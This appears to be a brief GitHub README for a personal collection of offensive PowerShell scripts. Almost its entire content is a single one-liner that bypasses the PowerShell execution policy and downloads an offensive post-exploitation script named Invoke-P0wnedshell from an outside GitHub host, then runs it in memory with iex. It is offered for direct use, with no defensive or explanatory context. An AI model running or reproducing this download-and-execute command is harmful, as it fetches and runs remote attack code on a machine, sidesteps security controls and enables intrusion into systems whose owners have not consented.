# OFFSEC-PowerShell
My Favorite Offensive Security Scripts

IEX:

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/OFFSEC-PowerShell/main/Invoke-P0wnedshell.ps1'))
